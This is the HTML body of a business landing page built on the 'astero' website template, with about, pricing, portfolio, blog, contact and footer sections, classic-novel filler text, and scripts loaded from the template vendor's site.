		</div><!-- Expandable Background 4 /- -->
		<!-- About Section -->
		<div class="about-section container-fluid no-padding">
			<!-- Container -->
			<div class="container">
				<!-- Row -->
				<div class="row">
					<!-- Accordion Block Layout2 -->
					<div class="col-md-6 accordion-block layout2 no-padding">
						<div class="col-md-12 col-sm-12">
							<div class="padding-100"></div>
							<!-- Section Header -->
							<div class="section-header-6 section-header-7">
								<h3>about us</h3>
							</div><!-- Section Header /- -->
							<div class="panel-group" id="accordion_2" role="tablist" aria-multiselectable="true">
								<div class="panel panel-default">
									<div class="panel-heading" role="tab" id="accordion_2_1">
										<h4 class="panel-title">
											<a role="button" data-toggle="collapse" data-parent="#accordion_2" href="#accordion2_1" aria-expanded="true">At first, for some time</a>
										</h4>
									</div>
									<div id="accordion2_1" class="panel-collapse collapse in" role="tabpanel" aria-labelledby="accordion_2_1">
										<div class="panel-body">
											<p>To these in the morning I sent the captain, who was to enter into a parley with them; in a word, to try them, and tell me whether he thought they might be trusted or not to go on board and surprise the ship.</p>
											<a href="#" title="Details">Details</a>
										</div>
									</div>
								</div>
								<div class="panel panel-default">
									<div class="panel-heading" role="tab" id="accordion_2_2">
										<h4 class="panel-title">
											<a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion_2" href="#accordion2_2" aria-expanded="false">I had a great mind to bring it home</a>
										</h4>
									</div>
									<div id="accordion2_2" class="panel-collapse collapse" role="tabpanel" aria-labelledby="accordion_2_2">
										<div class="panel-body"> 
											<p>To these in the morning I sent the captain, who was to enter into a parley with them; in a word, to try them, and tell me whether he thought they might be trusted or not to go on board and surprise the ship.</p>
											<a href="#" title="Details">Details</a>
										</div>
									</div>
								</div>
								<div class="panel panel-default">
									<div class="panel-heading" role="tab" id="accordion_2_3">
										<h4 class="panel-title">
											<a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion_2" href="#accordion2_3" aria-expanded="false">She gave my mother such a turn</a>
										</h4>
									</div>
									<div id="accordion2_3" class="panel-collapse collapse" role="tabpanel" aria-labelledby="accordion_2_3">
										<div class="panel-body">
											<p>To these in the morning I sent the captain, who was to enter into a parley with them; in a word, to try them, and tell me whether he thought they might be trusted or not to go on board and surprise the ship.</p>
											<a href="#" title="Details">Details</a>
										</div>
									</div>
								</div>
							</div>
							<div class="padding-100"></div>
						</div>
					</div><!-- Accordion Block Layout2 /- -->
					<div class="col-md-6">
						<img src="http://themesquared.com/html/astero/images/home/about1-1.jpg" alt="About" />
					</div>
				</div><!-- Row /- -->
			</div><!-- Container /- -->
		</div><!-- About Section /- -->
		
		<!-- Video Presentation Fullwidth -->
		<div class="video-presentation-fullwidth home1-video container-fluid no-padding">
			<div class="container">
				<h3>our Awesome video</h3>
				<a href="#" class="Watch Video">watch video</a>
			</div>
		</div><!-- Video Vimeo Bg -->
		
		<div class="padding-100"></div>
		
		<div class="text-tab-section container-fluid no-padding">
			<!-- Container -->
			<div class="container">
				<!-- Row -->
				<div class="row">
					<div class="col-md-6 col-sm-6 col-xs-12 quotes-section">
						<div class="quote-style-1">
							<div class="block-title">
								<h5>This I have produced </h5>
							</div>
							<p>At first, for some time, I was not able to answer him one word; but as he had taken me in his arms I held fast by him, or I should have fallen to the ground. I confess this side of the country was much pleasanter than mine; but yet I had not the least inclination to remove, for as I was fixed in my habitation it became natural to me, and I seemed</p>
							<blockquote>She gave my mother such a turn, that I have always been convinced I am indebted to Miss Betsey<span>Charles Dickens</span></blockquote>
							<p>However, I travelled along the shore of the sea towards the east, I suppose about twelve miles, and then setting up a great pole upon the shore.</p>
						</div>
					</div>
					<div class="col-md-6 col-sm-6 col-xs-12 tab-style">
						<div class="main-tab-style-1">
							<!-- Nav tabs -->
							<ul class="nav nav-tabs" role="tablist">
								<li role="presentation" class="active"><a href="#about" role="tab" data-toggle="tab">About</a></li>
								<li role="presentation"><a href="#items" role="tab" data-toggle="tab">Items</a></li>
								<li role="presentation"><a href="#description" role="tab" data-toggle="tab">Description</a></li>
							</ul>
							<!-- Tab panes -->
							<div class="tab-content">
								<div role="tabpanel" class="tab-pane active" id="about">
									<p>At first, for some time, I was not able to answer him one word; but as he had taken me in his arms I held fast by him, or I should have fallen to the ground. I confess this side of the country was much pleasanter than mine</p>
									<div class="img-block"><img src="http://themesquared.com/html/astero/images/home/home1-tabs.jpg" alt="Tabs" /></div>
									<p>I was not able to answer him one word; but as he had taken me in his arms I held fast by him, or I should have fallen to the ground. </p>
								</div>
								<div role="tabpanel" class="tab-pane" id="items">
									<p>I was not able to answer him one word; but as he had taken me in his arms I held fast by him, or I should have fallen to the ground. </p>
									<div class="img-block"><img src="http://themesquared.com/html/astero/images/home/home1-tabs.jpg" alt="Tabs" /></div>
									<p>At first, for some time, I was not able to answer him one word; but as he had taken me in his arms I held fast by him, or I should have fallen to the ground. I confess this side of the country was much pleasanter than mine</p>
								</div>
								<div role="tabpanel" class="tab-pane" id="description">
									<p>I held fast by him, or I should have fallen to the ground. I confess this side of the country was much pleasanter than mine At first, for some time, I was not able to answer him one word; but as he had taken me in his arms </p>
									<div class="img-block"><img src="http://themesquared.com/html/astero/images/home/home1-tabs.jpg" alt="Tabs" /></div>
									<p>I held fast by him, or I should have fallen to the ground. I was not able to answer him one word; but as he had taken me in his arms </p>
								</div>
							</div>
						</div>
					</div>
				</div><!-- Row /- -->
			</div><!-- Container /- -->
		</div>
		
		<div class="padding-50"></div>
		
		<!-- Pricing Style -->
		<div class="pricing-style pricing-style-4 pricing-home1 pricing-bg container-fluid no-padding">
			<div class="container">
				<!-- Row -->
				<div class="row">
					<div class="col-md-4 col-sm-6 col-xs-6">
						<div class="pricing-content" data-image="gambar/w.jpg">
							<div class="pricing-title">
								<h3>$39</h3>
								<p>standard</p>
							</div>
							<a href="#" title="Order Plan" class="order-plan">Order Plan</a>
						</div>
					</div>
					<div class="col-md-4 col-sm-6 col-xs-6">
						<div class="pricing-content" data-image="gambar/poto.jpg">
							<div class="pricing-title">
								<h3>$49</h3>
								<p>optimal</p>
							</div>
							<a href="#" title="Order Plan" class="order-plan">Order Plan</a>
						</div>
					</div>
					<div class="col-md-4 col-sm-6 col-xs-6">
						<div class="pricing-content" data-image="gambar/2.jpg">
							<div class="pricing-title">
								<h3>$59</h3>
								<p>exception</p>
							</div>
							<a href="#" title="Order Plan" class="order-plan">Order Plan</a>
						</div>
					</div>
				</div><!-- Row /- -->
			</div>
		</div><!-- Pricing Style 4 -->
		
		<div class="padding-80"></div>
		
		<!-- ContentSlider Layout1 -->
		<div class="contentslider-section contentslider-layout1 container-fluid no-padding">
			<!-- ContentSlider Carousel -->
			<div id="contentslider_1" class="carousel slide" data-ride="carousel">
				<ol class="carousel-indicators">
					<li data-target="#contentslider_1" data-slide-to="0" class="active"></li>
					<li data-target="#contentslider_1" data-slide-to="1"></li>
					<li data-target="#contentslider_1" data-slide-to="2"></li>
					<li data-target="#contentslider_1" data-slide-to="3"></li>
				</ol>
				<div class="carousel-inner" role="listbox">
					<div class="item active">
						<div id="content_img1-1"  class="content-slider-img" data-image="http://themesquared.com/html/astero/images/contentslider/home1-contentslider1_1.jpg"></div>
						<div class="carousel-caption">
							<div class="container">
								<div class="col-md-6 contentslider-content no-padding">
									<h3>So saying he unbuckled</h3>
									<p>A hundred thousand grateful loves to your dear papa and mamma . Is your poor brother recovered of his rack - punch ? Oh, dear! Oh, dear! How men should beware of wicked punch!A carriage and four splendid horses, covered with armorial bearings, however, awaited us at Mudbury, four miles from Queen's Crawley, and we made our entrance to the baronet's park in state. </p>
								</div>
							</div>
						</div>
					</div>
					<div class="item">
						<div id="content_img1-2"  class="content-slider-img" data-image="http://themesquared.com/html/astero/images/contentslider/contentslider2_1.jpg"></div>
						<div class="carousel-caption">
							<div class="container">
								<div class="col-md-6 contentslider-content no-padding">
									<h3>So saying he unbuckled</h3>
									<p>A hundred thousand grateful loves to your dear papa and mamma . Is your poor brother recovered of his rack - punch ? Oh, dear! Oh, dear! How men should beware of wicked punch!A carriage and four splendid horses, covered with armorial bearings, however, awaited us at Mudbury, four miles from Queen's Crawley, and we made our entrance to the baronet's park in state. </p>
								</div>
							</div>
						</div>
					</div>
					<div class="item">
						<div id="content_img1-3"  class="content-slider-img" data-image="http://themesquared.com/html/astero/images/contentslider/contentslider1_1.jpg"></div>
						<div class="carousel-caption">
							<div class="container">
								<div class="col-md-6 contentslider-content no-padding">
									<h3>So saying he unbuckled</h3>
									<p>A hundred thousand grateful loves to your dear papa and mamma . Is your poor brother recovered of his rack - punch ? Oh, dear! Oh, dear! How men should beware of wicked punch!A carriage and four splendid horses, covered with armorial bearings, however, awaited us at Mudbury, four miles from Queen's Crawley, and we made our entrance to the baronet's park in state. </p>
								</div>
							</div>
						</div>
					</div>
					<div class="item">
						<div id="content_img1-4"  class="content-slider-img" data-image="http://themesquared.com/html/astero/images/contentslider/home1-contentslider1_1.jpg"></div>
						<div class="carousel-caption">
							<div class="container">
								<div class="col-md-6 contentslider-content no-padding">
									<h3>So saying he unbuckled</h3>
									<p>A hundred thousand grateful loves to your dear papa and mamma . Is your poor brother recovered of his rack - punch ? Oh, dear! Oh, dear! How men should beware of wicked punch!A carriage and four splendid horses, covered with armorial bearings, however, awaited us at Mudbury, four miles from Queen's Crawley, and we made our entrance to the baronet's park in state. </p>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div><!-- ContentSlider Carousel /- -->
		</div><!-- ContentSlider Layout1 /- -->
		
		<!-- Skill Section -->
		<div class="container-fluid no-padding skill-section home1-skill-section">
			<!-- Container -->
			<div class="container">
				<!-- Row -->
				<div class="row">
					<div class="col-md-6">
						<img src="http://themesquared.com/html/astero/images/home/awesome-skill1.jpg" alt="Awesome Skill"/>
					</div>
					<div class="col-md-6">
						<div class="section-padding"></div>
						<!-- Section Header -->
						<div class="section-header">
							<h3>Awesome Services</h3>
							<p>At first, for some time, I was not able to answer him one word; but as he had taken me in his arms I held fast by him, or I should have ground.</p>
						</div><!-- Section Header /- -->
						
						<div id="skill_type-2" class="skill-section-2">
							<div class="skill-progress-box">
								<h3 class="block-title">Graphic Design <span data-skill_percent="34" id="skill_2_count-1">34</span></h3>
								<div class="progress">
									<div class="progress-bar progress-bar-danger illustrator" role="progressbar" id="skill_bar_2_count-1"></div>
								</div>
							</div>
							<div class="skill-progress-box">
								<h3 class="block-title">Web Development<span data-skill_percent="85" id="skill_2_count-2">85</span></h3>
								<div class="progress">
									<div class="progress-bar progress-bar-danger illustrator" role="progressbar" id="skill_bar_2_count-2"></div>
								</div>
							</div>
							<div class="skill-progress-box">
								<h3 class="block-title">Identity<span data-skill_percent="56" id="skill_2_count-3">56</span></h3>
								<div class="progress">
									<div class="progress-bar progress-bar-danger illustrator" role="progressbar" id="skill_bar_2_count-3"></div>
								</div>
							</div>
							<div class="skill-progress-box">
								<h3 class="block-title">Graphic Design <span data-skill_percent="34" id="skill_2_count-4">34</span></h3>
								<div class="progress">
									<div class="progress-bar progress-bar-danger illustrator" role="progressbar" id="skill_bar_2_count-4"></div>
								</div>
							</div>
							<div class="skill-progress-box">
								<h3 class="block-title">Web Development<span data-skill_percent="85" id="skill_2_count-5">85</span></h3>
								<div class="progress">
									<div class="progress-bar progress-bar-danger illustrator" role="progressbar" id="skill_bar_2_count-5"></div>
								</div>
							</div>
							<div class="skill-progress-box">
								<h3 class="block-title">Identity<span data-skill_percent="56" id="skill_2_count-6">56</span></h3>
								<div class="progress">
									<div class="progress-bar progress-bar-danger illustrator" role="progressbar" id="skill_bar_2_count-6"></div>
								</div>
							</div>
						</div>
						<div class="padding-100"></div>
					</div>
				</div><!-- Row /- -->
			</div><!-- Container /- -->
		</div><!-- Skill Section /- -->
		
		<!-- Portfolio Section -->
		<div class="portfolio-section portfolio-full portfolio-full-5-col-no-space container-fluid no-padding">
			<ul class="portfolio-list">
				<li class="col-md-3 col-sm-4 col-xs-6 no-padding design photo">
					<a href="#">
						<div class="portfolio-box">
							<img alt="portfolio" src="http://themesquared.com/html/astero/images/portfolio/full-5-col-6.jpg">
							<div class="hover-content">
								<h4>Alice wondered a little at this</h4>
							</div>
						</div>
					</a>
				</li>
				<li class="col-md-3 col-sm-4 col-xs-6 no-padding drawing photo">
					<a href="#">
						<div class="portfolio-box">
							<img alt="portfolio" src="http://themesquared.com/html/astero/images/portfolio/full-5-col-7.jpg">
							<div class="hover-content">
								<h4>but she was too much in awe</h4>
							</div>
						</div>
					</a>
				</li>
				<li class="col-md-3 col-sm-4 col-xs-6 no-padding design photo">
					<a href="#">
						<div class="portfolio-box">
							<img alt="portfolio" src="http://themesquared.com/html/astero/images/portfolio/full-5-col-8.jpg">
							<div class="hover-content">
								<h4>This sounded a very good reason</h4>
							</div>
						</div>
					</a>
				</li>
				<li class="col-md-3 col-sm-4 col-xs-6 no-padding design photo">
					<a href="#">
						<div class="portfolio-box">
							<img alt="portfolio" src="http://themesquared.com/html/astero/images/portfolio/full-5-col-9.jpg">
							<div class="hover-content">
								<h4>was too much in awe of the Queen</h4>
							</div>
						</div>
					</a>
				</li>
				<li class="col-md-3 col-sm-4 col-xs-6 no-padding drawing photo">
					<a href="#">
						<div class="portfolio-box">
							<img alt="portfolio" src="http://themesquared.com/html/astero/images/portfolio/full-5-col-10.jpg">
							<div class="hover-content">
								<h4>but she was too much in awe</h4>
							</div>
						</div>
					</a>
				</li>
				<li class="col-md-3 col-sm-4 col-xs-6 no-padding design drawing">
					<a href="#">
						<div class="portfolio-box">
							<img alt="portfolio" src="http://themesquared.com/html/astero/images/portfolio/full-5-col-11.jpg">
							<div class="hover-content">
								<h4>Alice wondered a little at this</h4>
							</div>
						</div>
					</a>
				</li>
				<li class="col-md-3 col-sm-4 col-xs-6 no-padding drawing photo">
					<a href="#">
						<div class="portfolio-box">
							<img alt="portfolio" src="http://themesquared.com/html/astero/images/portfolio/full-5-col-12.jpg">
							<div class="hover-content">
								<h4>but she was too much in awe</h4>
							</div>
						</div>
					</a>
				</li>
				<li class="col-md-3 col-sm-4 col-xs-6 no-padding design drawing">
					<a href="#">
						<div class="portfolio-box">
							<img alt="portfolio" src="http://themesquared.com/html/astero/images/portfolio/full-5-col-13.jpg">
							<div class="hover-content">
								<h4>This sounded a very good reason</h4>
							</div>
						</div>
					</a>
				</li>
				<li class="col-md-3 col-sm-4 col-xs-6 no-padding drawing photo">
					<a href="#">
						<div class="portfolio-box">
							<img alt="portfolio" src="http://themesquared.com/html/astero/images/portfolio/full-5-col-14.jpg">
							<div class="hover-content">
								<h4>was too much in awe of the Queen</h4>
							</div>
						</div>
					</a>
				</li>
				<li class="col-md-3 col-sm-4 col-xs-6 no-padding design drawing">
					<a href="#">
						<div class="portfolio-box">
							<img alt="portfolio" src="http://themesquared.com/html/astero/images/portfolio/full-5-col-15.jpg">
							<div class="hover-content">
								<h4>but she was too much in awe</h4>
							</div>
						</div>
					</a>
				</li>
			</ul>
		</div><!-- Portfolio Section /- -->
		<div class="padding-100"></div>
		<!-- Interactive Style 2 -->
		<div class="interactive-style interactive-style-2 container-fluid no-padding home1-interactive-style">
			<div class="container">
				<!-- Section Header -->
				<div class="section-header section-header-2">
					<h3>Awesome Services</h3>
					<p>At first, for some time, I was not able to answer him one word; but as he had taken me in his arms I held fast by him, or I should have ground.</p>
				</div><!-- Section Header /- -->
				<!-- Row -->
				<div class="row">
					<div class="col-md-6 col-sm-6 col-xs-6">
						<div class="interactive-box">
							<div class="interactive-img">
								<img src="gambar/1.jpg" alt="interactive" width="570" height="370" />
							</div>
							<div class="interactive-content">
								<h3>Amazing</h3>
							</div>
							<div class="interactive-top-content">
								<p>At first, for some time, I was not able to answer him one word but as he had taken me in his arms I held fast by him, or I should have fallen to the ground. </p>
							</div>
						</div>
					</div>
					<div class="col-md-6 col-sm-6 col-xs-6">
						<div class="interactive-box">
							<div class="interactive-img">
								<img src="gambar/2.jpg" alt="interactive" width="570" height="370" />
							</div>
							<div class="interactive-content">
								<h3>Awesome</h3>
							</div>
							<div class="interactive-top-content">
								<p>At first, for some time, I was not able to answer him one word but as he had taken me in his arms I held fast by him, or I should have fallen to the ground. </p>
							</div>
						</div>
					</div>
					<div class="col-md-6 col-sm-6 col-xs-6">
						<div class="interactive-box">
							<div class="interactive-img">
								<img src="gambar/3.jpg" alt="interactive" width="570" height="370" />
							</div>
							<div class="interactive-content">
								<h3>Amazing</h3>
							</div>
							<div class="interactive-top-content">
								<p>At first, for some time, I was not able to answer him one word but as he had taken me in his arms I held fast by him, or I should have fallen to the ground. </p>
							</div>
						</div>
					</div>
					<div class="col-md-6 col-sm-6 col-xs-6">
						<div class="interactive-box">
							<div class="interactive-img">
								<img src="gambar/4.jpg" alt="interactive" width="570" height="370" />
							</div>
							<div class="interactive-content">
								<h3>Awesome</h3>
							</div>
							<div class="interactive-top-content">
								<p>At first, for some time, I was not able to answer him one word but as he had taken me in his arms I held fast by him, or I should have fallen to the ground. </p>
							</div>
						</div>
					</div>
				</div><!-- Row /- -->
			</div>
		</div><!-- Interactive Style 2 -->
		<div class="padding-50"></div>
		
		<!-- Piechart Style 3 -->
		<div class="piechart-style piechart-style-3 icon-piechart home1-piechart container-fluid no-padding">
			<!-- Container -->
			<div class="container">
				<!-- Row -->
				<div class="row">
					<div id="skill_circuler-3" class="skill-progress">
						<div class="col-md-3 col-sm-6 skill-box">
							<div class="skill-icon">
								<input class="dial" data-angleOffset="0" data-angleArc="360" data-animation="fade-in" data-fgColor="#d49d19" data-bgcolor="transparent" data-delay="0" data-linecap="square" data-readonly="true" data-displayinput="false" data-thickness=".08" data-value="56" data-width="140" data-height="140" type="text" value="0"/>
								<i class="fa fa-heart" aria-hidden="true"></i>
							</div>
							<div class="skill-content">
								<h3 id="skill_3_count-1" data-skills_percent="56" class="creative-skill ci">%</h3>
								<a href="#" class="skill-link">creative ideas</a>
							</div>
						</div>
						<div class="col-md-3 col-sm-6 skill-box">
							<div class="skill-icon">
								<input class="dial" data-angleOffset="0" data-angleArc="360" data-animation="fade-in" data-fgColor="#d49d19" data-bgcolor="transparent" data-delay="0" data-linecap="square" data-readonly="true" data-displayinput="false" data-thickness=".08" data-value="92" data-width="140" data-height="140" type="text" value="0" />
								<i class="fa fa-hourglass" aria-hidden="true"></i>
							</div>
							<div class="skill-content">
								<h3 id="skill_3_count-2" data-skills_percent="92" class="creative-skill ci">%</h3>
								<a href="#" class="skill-link">solutions</a>
							</div>
						</div>
						<div class="col-md-3 col-sm-6 skill-box">
							<div class="skill-icon">
								<input class="dial" data-angleOffset="0" data-angleArc="360" data-animation="fade-in" data-fgColor="#d49d19" data-bgcolor="transparent" data-delay="0" data-linecap="square" data-readonly="true" data-displayinput="false" data-thickness=".08" data-value="72" data-width="140" data-height="140" type="text" value="0" />
								<i class="fa fa-cutlery" aria-hidden="true"></i>
							</div>
							<div class="skill-content">
								<h3 id="skill_3_count-3" data-skills_percent="72" class="creative-skill ci">%</h3>
								<a href="#" class="skill-link">projects</a>
							</div>
						</div>
						<div class="col-md-3 col-sm-6 skill-box">
							<div class="skill-icon">
								<input class="dial" data-angleOffset="0" data-angleArc="360" data-animation="fade-in" data-fgColor="#d49d19" data-bgcolor="transparent" data-delay="0" data-linecap="square" data-readonly="true" data-displayinput="false" data-thickness=".08" data-value="82" data-width="140" data-height="140" type="text" value="0" />
								<i class="fa fa-bank" aria-hidden="true"></i>
							</div>
							<div class="skill-content">
								<h3 id="skill_3_count-4" data-skills_percent="82" class="creative-skill ci">%</h3>
								<a href="#" class="skill-link">PROJECTS</a>
							</div>
						</div>
						<div class="col-md-3 col-sm-6 skill-box">
							<div class="skill-icon">
								<input class="dial" data-angleOffset="0" data-angleArc="360" data-animation="fade-in" data-fgColor="#d49d19" data-bgcolor="transparent" data-delay="0" data-linecap="square" data-readonly="true" data-displayinput="false" data-thickness=".08" data-value="34" data-width="140" data-height="140" type="text" value="0" />
								<i class="fa fa-database" aria-hidden="true"></i>
							</div>
							<div class="skill-content">
								<h3 id="skill_3_count-5" data-skills_percent="34" class="creative-skill ci">%</h3>
								<a href="#" class="skill-link">customer support</a>
							</div>
						</div>
					</div>
				</div><!-- Row /- -->
			</div><!-- Container /- -->
		</div><!-- Piechart Style 3 -->
		
		<div class="padding-50"></div>
		
		<!-- Blog Section -->
		<div class="blog-section blog_masonry blogfullwidth_2col home1-blog-section">
			<!-- Container --> 
			<div class="container">	
				<!-- Section Header -->
				<div class="section-header section-header-2">
					<h3>Corporate blog</h3>
					<p>At first, for some time, I was not able to answer him one word; but as he had taken me in his arms I held fast by him, or I should have ground.</p>
				</div><!-- Section Header /- -->
				<div class="row">
					<div class="blog-masonry-list">				
						<div class="col-md-6 col-sm-6 blog-masonry-box">
							<article class="type-post image-post">
								<div class="entry-cover">
									<a title="Cover" href="#"><img alt="blog" src="http://themesquared.com/html/astero/images/blog/home1-blog-1.jpg"></a>
								</div>
								<h3 class="entry-title"><a href="#" title="Tumblers restored Bob Sawyer">Tumblers restored Bob Sawyer</a></h3>
								<div class="entry-meta">
									<div class="post-by">
										<a href="#"><img src="http://themesquared.com/html/astero/images/blog/blogauthor_2.jpg" alt="blogauthor"/>Zachary Bush</a> in <a href="#" title="Life blog">Life blog</a>
									</div>
									<div class="post-share">
										<a href="#" title="17"><i class="fa fa-share-alt" aria-hidden="true"></i>17</a>
									</div>
									<div class="post-date">
										<a href="#" title="26 September 2016, 7:58 PM"><i class="fa fa-clock-o" aria-hidden="true"></i>26 September 2016, 7:58 PM</a>
									</div>
								</div>
								<div class="entry-content">
									<p>At first, for some time, I was not able to answer him one word; but as he had taken me in his arms I held fast by him, or I should have fallen to the ground... </p>
								</div>
							</article>
						</div>
						<div class="col-md-6 col-sm-6 blog-masonry-box">	
							<article class="type-post image-post">
								<div class="entry-cover">
									<a title="Cover" href="#"><img alt="blog" src="http://themesquared.com/html/astero/images/blog/home1-blog-2.jpg"></a>
								</div>
								<h3 class="entry-title"><a href="#" title="Thus much I thought proper to tell you">Thus much I thought proper to tell you in relation to yourself</a></h3>
								<div class="entry-meta">
									<div class="post-by">
										<a href="#"><img src="http://themesquared.com/html/astero/images/blog/blogauthor_4.jpg" alt="blogauthor"/>Zachary Bush</a> in <a href="#" title="Life blog">Life blog</a>
									</div>
									<div class="post-share">
										<a href="#" title="17"><i class="fa fa-share-alt" aria-hidden="true"></i>17</a>
									</div>
									<div class="post-date">
										<a href="#" title="26 September 2016, 7:58 PM"><i class="fa fa-clock-o" aria-hidden="true"></i>26 September 2016, 7:58 PM</a>
									</div>
								</div>
								<div class="entry-content">
									<p>At first, for some time, I was not able to answer him one word; but as he had taken me in his arms I held fast by him, or I should have fallen to the ground... </p>
								</div>
							</article>
						</div>
					</div>
				</div>
			</div>
		</div><!-- Blog Section /- -->
		<div class="padding-90"></div>
		
		<!-- Client Carousel 1 -->
		<div class="client-section clientsection-home1">
			<div class="clientcarousel-layout1 container-fluid no-padding">
				<div class="container">
					<div class="client_carousel-1">
						<div class="client-box">
							<a href="#"><img src="http://themesquared.com/html/astero/images/client/client-style1_1.png" alt="client"/></a>
						</div>
						<div class="client-box">
							<a href="#"><img src="http://themesquared.com/html/astero/images/client/client-style1_2.png" alt="client"/></a>
						</div>
						<div class="client-box">
							<a href="#"><img src="http://themesquared.com/html/astero/images/client/client-style1_3.png" alt="client"/></a>
						</div>
						<div class="client-box">
							<a href="#"><img src="http://themesquared.com/html/astero/images/client/client-style1_4.png" alt="client"/></a>
						</div>
						<div class="client-box">
							<a href="#"><img src="http://themesquared.com/html/astero/images/client/client-style1_5.png" alt="client"/></a>
						</div>
						<div class="client-box">
							<a href="#"><img src="http://themesquared.com/html/astero/images/client/client-style1_6.png" alt="client"/></a>
						</div>
					</div>
				</div>
			</div>
		</div><!-- Client Carousel 1 /- -->
		
		<!-- Map Layout1 -->
		<div class="map map-layout1">
			<div id="map-canvas-contact1" class="map-canvas"  data-lat="-37.817214" data-lng="144.955925" data-string="16122 Collins Street West, Victoria 8007 Australia" data-zoom="12"></div>
		</div><!-- Map Layout1 /- -->
		<div class="padding-100"></div>
		
		<!-- Contact section -->
		<div class="container-fluid no-padding contact-section">
			<!-- Container -->
			<div class="container">
				<div class="block-title">
					<h5>Get in touch</h5>
				</div>
				<!-- Row -->
				<div class="row">
					<div class="col-md-6 col-sm-6 col-xs-12">
						<div class="contact-form">
							<form class="form-style-2">
								<fieldset>
									<legend>Name</legend>
									<input type="text" name="contact-name" class="form-control" id="input_name" required="">
								</fieldset>
								<fieldset>
									<legend>Email</legend>
									<input type="email" name="contact-email" class="form-control" id="input_email" required="">
								</fieldset>											
								<fieldset>
									<legend>Message</legend>
									<textarea name="contact-message" class="form-control" id="textarea_message" rows="4"></textarea>
								</fieldset>	
								<button  id="btn_submit" type="submit" title="Send message">Send message</button>
								<div id="alert-msg" class="alert-msg"></div>
							</form>
						</div>
					</div>
					<div class="col-md-6 col-sm-6 col-xs-12 contact-detail">
						<div class="contact-info">
							<h4><a href="#">+62 853 1418 8808</a></h4>
							<p>Villa Cilame Indah</p>
							<a href="mailto:test@test.com" title="astero@astero.com">astero@astero.com</a>
						</div>
					</div>
				</div><!-- Row /- -->
			</div><!-- Container /- -->
		</div><!-- Contact section /- -->
		<div class="padding-100"></div>
	</main>
	
	
	<!-- Footer Section -->
	<footer class="fotoer-main footer-section-1 container-fluid no-padding">
		<!-- Top Footer -->
		<div class="top-footer container-fluid no-padding">
			<!-- Container -->
			<div class="container">
				<ul class="ftr-social">
					<li><a href="#" title=""><i class="fa fa-twitter"></i></a></li>
					<li><a href="#" title=""><i class="fa fa-google"></i></a></li>
					<li><a href="#" title=""><i class="fa fa-behance"></i></a></li>
					<li><a href="#" title=""><i class="fa fa-linkedin"></i></a></li>
					<li><a href="#" title=""><i class="fa fa-instagram"></i></a></li>
					<li><a href="#" title=""><i class="fa fa-dribbble"></i></a></li>
					<li><a href="#" title=""><i class="fa fa-rss"></i></a></li>
				</ul>
				<div class="row">
					<div class="col-md-3 col-sm-3 col-xs-6">
						<!-- Widget About -->
						<aside class="widget widget_about">
							<a href="#" title="Logo"><img src="http://themesquared.com/html/astero/images/ftr-logo.png" alt="Logo" />astero</a>
							<p>And she went on planning to herself how she would manage it. `They must go by the carrier she thought; and how funny it'll seem, sending presents to one's own feet!...</p>
						</aside><!-- Widget About /- -->
					</div>
					<div class="col-md-3 col-sm-3 col-xs-6">
						<!-- Widget Get In Touch -->
						<div class="widget widget_getintouch">
							<div class="widget-title">
								<h3>Get in touch</h3>
							</div>
							<!-- Map Layout1 -->
							<div class="map">
								<div id="map-canvas-contact2" class="map-canvas"  data-lat="-37.817214" data-lng="144.955925" data-string="16122 Collins Street West, Victoria 8007 Australia" data-zoom="12"></div>
							</div><!-- Map Layout1 /- -->
							<p><a href="tel:+61383766284" title="+61383766284"><i class="fa fa-phone"></i>+62 853 1418 8808</a></p>
							<p><i class="fa fa-map-marker"></i>Villa Cilame Indah</p>
						</div><!-- Widget Get In Touch /- -->
					</div>
					<div class="col-md-3 col-sm-3 col-xs-6">
						<!-- Widget Get In Touch -->
						<div class="widget widget_twitter">
							<div class="widget-title">
								<a href="javascript:void(0)" class="btn prev"><i class="fa fa-angle-left"></i></a>
								<a href="javascript:void(0)" class="btn next"><i class="fa fa-angle-right"></i></a>
								<h3>Twitter</h3>
							</div>
							<div id="twitter-feeds" class="carousel slide twitter-feeds" data-ride="carousel">
								<!-- Carousel Inner -->
								<div class="carousel-inner" id="tweets-feed" role="listbox">
									<div id="tweecool"></div>
								</div><!-- Carousel Inner -->
							</div>
						</div><!-- Widget Get In Touch /- -->
					</div>
					<div class="col-md-3 col-sm-3 col-xs-6">
						<!-- Widget Get In Touch -->
						<div class="widget widget_instagram">
							<div class="widget-title">
								<!--a href="javascript:void(0)" class="btn prev"><i class="fa fa-angle-left"></i></a>
								<a href="javascript:void(0)" class="btn next"><i class="fa fa-angle-right"></i></a-->
								<h3>Instagram</h3>
							</div>
							<div class="instagram-feeds row">
								<ul class="social-instafeeds"></ul>
							</div>
							<!--div class="instagram-carousel">
								<div class="item">
									<a href="#" title=""><img src="images/insta1.jpg" alt="Instagram" /></a>
								</div>
								<div class="item">
									<a href="#" title=""><img src="images/insta2.jpg" alt="Instagram" /></a>
								</div>
								<div class="item">
									<a href="#" title=""><img src="images/insta3.jpg" alt="Instagram" /></a>
								</div>
								<div class="item">
									<a href="#" title=""><img src="images/insta3.jpg" alt="Instagram" /></a>
								</div>
							</div-->
						</div><!-- Widget Get In Touch /- -->
					</div>
				</div>
			</div><!-- Container /- -->
		</div><!-- Top Footer /- -->
		<!-- Bottom Footer -->
		<div class="bottom-footer container-fluid">
			<!-- Container -->
			<div class="container">
				<p>&copy; 2016 astero psd template <span>Create in <img src="http://themesquared.com/html/astero/images/torbara-logo.png" alt="Torbara" /> torbara</span></p>
			</div><!-- Container /- -->
		</div><!-- Bottom Footer /- -->
	</footer><!-- Footer Section /- -->

	</div><!-- Main Box -->	
	
	<!-- JQuery v1.11.3 -->
	<script src="http://themesquared.com/html/astero/js/jquery.min.js"></script>
	<script src="http://themesquared.com/html/astero/libraries/tweecool.js"></script>
	<!-- Library JS -->
	<script src="http://themesquared.com/html/astero/libraries/lib.js"></script>
	<script src="http://themesquared.com/html/astero/libraries/lightslider/lightslider.min.js"></script>
	<!-- RS5.0 Core JS Files -->
	<script type="text/javascript" src="http://themesquared.com/html/astero/revolution/js/jquery.themepunch.tools.min.js?rev=5.0"></script>
	<script type="text/javascript" src="http://themesquared.com/html/astero/revolution/js/jquery.themepunch.revolution.min.js?rev=5.0"></script>
	<script type="text/javascript" src="http://themesquared.com/html/astero/revolution/js/extensions/revolution.extension.video.min.js"></script>
	<script type="text/javascript" src="http://themesquared.com/html/astero/revolution/js/extensions/revolution.extension.slideanims.min.js"></script>
